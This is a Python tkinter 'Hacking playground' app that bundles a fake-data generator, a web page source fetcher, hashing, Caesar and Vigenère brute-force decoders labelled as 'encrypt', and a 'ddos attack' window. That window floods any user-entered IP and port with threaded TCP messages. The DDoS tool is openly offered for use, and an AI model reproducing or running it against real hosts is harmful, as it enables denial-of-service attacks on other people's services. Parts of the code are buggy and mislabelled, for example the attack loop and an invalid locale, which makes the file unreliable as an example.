from tkinter import *
from faker import Faker
import requests
from cryptography.fernet import Fernet
import hashlib
import string
from itertools import chain, combinations
from functools import reduce
import socket
import sys
import threading

languages = ['English', 'Italian', 'Hebrew', 'Japanese']


class myThread(threading.Thread):
    def __init__(self, threadID, name, counter, ip, port, msg):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
        self.ip = ip
        self.port = port
        self.msg = msg

    def run(self):
        print("Starting " + self.name)
        attack(self.ip, self.port, self.msg, self.threadID)
        print("Exiting " + self.name)


def attack(ip, port, msg, thread_id):
    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Connect the socket to the port where the server is listening
    server_address = (ip, port)
    print(sys.stderr, 'connecting to %s port %s' % server_address)
    sock.connect(server_address)
    try:
        # Send data
        threadmsg = 'Thread-', thread_id, ':', msg
        message = str.encode(str(threadmsg))
        print(sys.stderr, 'thread-', thread_id, 'sending "%s"' % message)
        sock.sendall(message)
        # Look for the response
        amount_received = 0
        amount_expected = len(message)
        while amount_received < amount_expected:
            data = sock.recv(16)
            amount_received += len(data)
            print(sys.stderr, 'received "%s"' % data)
    finally:
        print(sys.stderr, 'closing socket')
        sock.close()


def run_ddos_attack(ip, port, message, threads_number, attacks_number):
    i = 0
    # Create new threads
    for idx in range(int(threads_number.get())):
        thread = myThread(idx, f"Thread-{idx + 1}", idx, ip.get(), int(port.get()), message.get())
        thread.start()
    while i < int(attacks_number.get()):
        # Start new Threads
        thread.run()

        i = i + 1
    print("Exiting Main Thread")


def ddos_attack_window():
    window = Toplevel(master)
    window.geometry("500x500")
    Label(window, text='Enter ip to attack', font=('calibre', 10, 'bold')).grid(row=0)
    ip_text = StringVar()
    Entry(window, textvariable=ip_text, font=('calibre', 10, 'normal')).grid(row=1)

    Label(window, text='Enter port number', font=('calibre', 10, 'bold')).grid(row=2)
    port_text = StringVar()
    Entry(window, textvariable=port_text, font=('calibre', 10, 'normal')).grid(row=3)

    Label(window, text='Enter message to send', font=('calibre', 10, 'bold')).grid(row=4)
    message_text = StringVar()
    Entry(window, textvariable=message_text, font=('calibre', 10, 'normal')).grid(row=5)

    Label(window, text='Enter number of threads', font=('calibre', 10, 'bold')).grid(row=6)
    threads_text = StringVar()
    Entry(window, textvariable=threads_text, font=('calibre', 10, 'normal')).grid(row=7)

    Label(window, text='Enter number of attacks to run', font=('calibre', 10, 'bold')).grid(row=8)
    attacks_text = StringVar()
    Entry(window, textvariable=attacks_text, font=('calibre', 10, 'normal')).grid(row=9)

    Button(window, text='Start ddos attack',
           command=lambda: run_ddos_attack(ip_text, port_text, message_text, threads_text, attacks_text)) \
        .grid(row=10)


def powerset(iterable):
    return chain.from_iterable(combinations(iterable, r) for r in range(len(iterable) + 1))


def encrypt_mssp(word, d, n, m, text):
    word = word.get().split('\n')
    tmp = word[-1].split('\r')
    word[-1] = tmp[0]
    word = ''.join(word)
    split = [word[i:i + int(d.get())] for i in range(0, len(word), int(d.get()))]
    lst = []
    idx = 0
    for _ in range(int(d.get())):
        lst.append(split[idx:int(m.get()) + idx])
        idx += int(m.get())
    x = [[int(float(j)) for j in i] for i in lst]
    lst = []
    for val in x:
        lst.append(list(powerset(val)))

    for idx1, in_lst in enumerate(lst):
        for idx, val in enumerate(in_lst):
            lst[idx1][idx] = sum(val)

    tmp = list(reduce(set.intersection, [set(item) for item in lst]))
    if tmp[0] == 0:
        text.insert(END, chars="None")
    else:
        tmp.remove(0)
        text.insert(END, chars=tmp[0])


def mssp_cipher_window():
    window = Toplevel(master)
    window.geometry("500x500")
    Label(window, text='word to cypher', font=('calibre', 10, 'bold')).grid(row=0)
    word_text = StringVar()
    Entry(window, textvariable=word_text, font=('calibre', 10, 'normal')).grid(row=1)

    Label(window, text='enter d', font=('calibre', 10, 'bold')).grid(row=2)
    d_text = StringVar()
    Entry(window, textvariable=d_text, font=('calibre', 10, 'normal')).grid(row=3)

    Label(window, text='enter n', font=('calibre', 10, 'bold')).grid(row=4)
    n_text = StringVar()
    Entry(window, textvariable=n_text, font=('calibre', 10, 'normal')).grid(row=5)

    Label(window, text='enter m', font=('calibre', 10, 'bold')).grid(row=6)
    m_text = StringVar()
    Entry(window, textvariable=m_text, font=('calibre', 10, 'normal')).grid(row=7)

    text_output = Text(window, height=60, width=60)
    text_output.grid(row=9)
    Button(window, text='encrypt text',
           command=lambda: encrypt_mssp(word_text, d_text, n_text, m_text, text_output)).grid(row=8)


def encrypt_vizner(message, text_output):
    text_output.delete('1.0', END)
    letters = string.ascii_lowercase
    for jump in range(0, 5):
        for key in range(len(string.ascii_lowercase)):
            translated = ''
            for idx, symbol in enumerate(message.get()):
                if symbol in letters:
                    num = letters.find(symbol)
                    num = num - (key + idx * jump)
                    if num < 0:
                        num = num + len(letters)
                    translated = translated + letters[num]
                else:
                    translated = translated + symbol
            text_output.insert(END, chars='offset #%s, jump #%s: %s\n' % (key, jump, translated))
        # print(chars='Hacking key #%s: %s' % (key, translated))


def vizner_cipher_window():
    window = Toplevel(master)
    window.geometry("500x500")
    Label(window, text='Choose ciphered word', font=('calibre', 10, 'bold')).grid(row=0)
    word_text = StringVar()
    Entry(window, textvariable=word_text, font=('calibre', 10, 'normal')).grid(row=4)
    text_output = Text(window, height=60, width=60)
    text_output.grid(row=6)
    Button(window, text='encrypt text',
           command=lambda: encrypt_vizner(word_text, text_output)).grid(row=5)


def encrypt_caesar(message, text_output):
    text_output.delete('1.0', END)
    letters = string.ascii_lowercase
    for key in range(len(string.ascii_lowercase)):
        translated = ''
        for symbol in message.get():
            if symbol in letters:
                num = letters.find(symbol)
                num = num - key
                if num < 0:
                    num = num + len(letters)
                translated = translated + letters[num]
            else:
                translated = translated + symbol
        text_output.insert(END, chars='#%s: %s\n' % (key, translated))
    # print(chars='Hacking key #%s: %s' % (key, translated))


def encrypt_caesar_window():
    window = Toplevel(master)
    window.geometry("500x500")
    Label(window, text='Choose ciphered word', font=('calibre', 10, 'bold')).grid(row=0)
    word_text = StringVar()
    Entry(window, textvariable=word_text, font=('calibre', 10, 'normal')).grid(row=4)
    text_output = Text(window, height=20, width=60)
    text_output.grid(row=6)
    Button(window, text='encrypt text',
           command=lambda: encrypt_caesar(word_text, text_output)).grid(row=5)


def sha_256(word):
    sha_signature = hashlib.sha256(word.encode()).hexdigest()
    return sha_signature


def fernet(word):
    key = Fernet.generate_key()
    cipher_suite = Fernet(key)
    cipher_text = cipher_suite.encrypt(word.encode())
    plain_text = cipher_suite.decrypt(cipher_text)
    return key, cipher_text, plain_text


def encrypt(name_word, cipher_entry, method):
    cipher_entry.delete(0, END)
    if method.get() == 0:
        key, cipher_text, plain_text = fernet(name_word.get())
    if method.get() == 1:
        cipher_text = sha_256(name_word.get())

    cipher_entry.insert(0, cipher_text)


def encrypt_window():
    window = Toplevel(master)
    window.geometry("1000x500")
    method = IntVar()
    Label(window, text='Choose hash function', font=('calibre', 10, 'bold')).grid(row=0)
    Radiobutton(window,
                text='fernet',
                padx=20,
                variable=method,
                value='0').grid(row=1)
    Radiobutton(window,
                text='sha-256',
                padx=20,
                variable=method,
                value='1').grid(row=2)
    Label(window, text='enter word', font=('calibre', 10, 'bold')).grid(row=3)
    cipher_text = StringVar()
    word_text = StringVar()
    Entry(window, textvariable=word_text, font=('calibre', 10, 'normal')).grid(row=4)
    Label(window, text='Cipher text is:', font=('calibre', 10, 'bold')).grid(row=6)
    cipher_entry = Entry(window, width=130, textvariable=cipher_text, font=('calibre', 10, 'normal'))
    cipher_entry.grid(row=7)

    Button(window, text='encrypt text',
           command=lambda: encrypt(word_text, cipher_entry, method)).grid(row=5)

    # text_source_code_url = Text(window, height=20, width=60)
    # text_source_code_url.grid(row=4)

    # Button(window, text='get source code',
    #        command=lambda: search_word(name_word, name_url, text_source_code_url)).grid(row=12)


def search_word(word, url, text):
    text.config(state='normal')
    text.delete('1.0', END)
    word = word.get()
    url = url.get()
    response = requests.get(url)
    data = response.text
    lst = []
    for i in range(0, len(data)):
        result_sub = data.find(word, i, i + len(word))
        if result_sub != -1:
            lst.append(result_sub)
            i += 5

    text.insert(END, chars=f'the word {word}: found at index {list(map(lambda x: x, lst))} \n\n'
                           f'source code: \n {data}')
    text.config(state=DISABLED)


def search_word_window():
    window = Toplevel(master)
    Label(window, text='enter url', font=('calibre', 10, 'bold')).grid(row=0)
    name_url = StringVar()
    Label(window, text='enter word to search', font=('calibre', 10, 'bold')).grid(row=2)
    name_word = StringVar()

    name_entry = Entry(window, textvariable=name_url, font=('calibre', 10, 'normal')).grid(row=1)
    name_entry = Entry(window, textvariable=name_word, font=('calibre', 10, 'normal')).grid(row=3)

    text_source_code_url = Text(window, height=20, width=60)
    text_source_code_url.grid(row=4)

    Button(window, text='get source code',
           command=lambda: search_word(name_word, name_url, text_source_code_url)).grid(row=12)


def generate_fake_data(lang, text):
    text.config(state='normal')
    text.delete('1.0', END)
    user_input = lang.get()
    if user_input == 1:
        fake = Faker('it_IT')
    elif user_input == 2:
        fake = Faker('he_IL')
    elif user_input == 3:
        fake = Faker('jp_JP')
    else:  # English
        fake = Faker()
    text.insert(END, chars=f'fake email: {fake.email()} \n'
                           f'fake name: {fake.name()} \n'
                           f'fake url: {fake.url()} \n'
                           f'fake text: {fake.text()} \n'
                           f'fake country: {fake.country()} \n')
    text.config(state=DISABLED)


def fake_data_window():
    window = Toplevel(master)
    Label(window, text='select language').grid(row=0)
    text = Text(window, height=20, width=60)
    text.grid(row=6)

    language_input = IntVar()
    for index, language in enumerate(languages):  # languages radio buttons
        Radiobutton(window,
                    text=language,
                    padx=20,
                    variable=language_input,
                    value=str(index)).grid(row=index + 1)
    Button(window, text='Generate fake data',
           command=lambda: generate_fake_data(language_input, text)).grid(row=5)
    window.geometry("600x700")
    window.mainloop()


if __name__ == '__main__':
    master = Tk()
    master.geometry("370x500")

    label = Label(master,
                  text="Hacking playground ", font='Helvetica 18 bold',
)
    label.pack(pady=10)

    btn = Button(master,
                 text="Fake data generator", font='Helvetica 10 bold',
                 command=fake_data_window, bg='#45b592')
    btn.pack(pady=10)

    btn = Button(master,
                 text="Search word in source code", font='Helvetica 10 bold',
                 command=search_word_window, bg='#45b592')
    btn.pack(pady=10)

    btn = Button(master,
                 text="Farnet & sha-256",font='Helvetica 10 bold',
                 command=encrypt_window, bg='#45b592')
    btn.pack(pady=10)
    btn = Button(master,
                 text="Caesar cipher",font='Helvetica 10 bold',
                 command=encrypt_caesar_window, bg='#45b592')
    btn.pack(pady=10)
    btn = Button(master,
                 text="vigenere cipher",font='Helvetica 10 bold',
                 command=vizner_cipher_window, bg='#45b592')
    btn.pack(pady=10)

    btn = Button(master,
                 text="mssp cipher",font='Helvetica 10 bold',
                 command=mssp_cipher_window, bg='#45b592')
    btn.pack(pady=10)

    btn = Button(master,
                 text="ddos attack",font='Helvetica 10 bold',
                 command=ddos_attack_window, bg='#45b592')
    btn.pack(pady=10)

    mainloop()
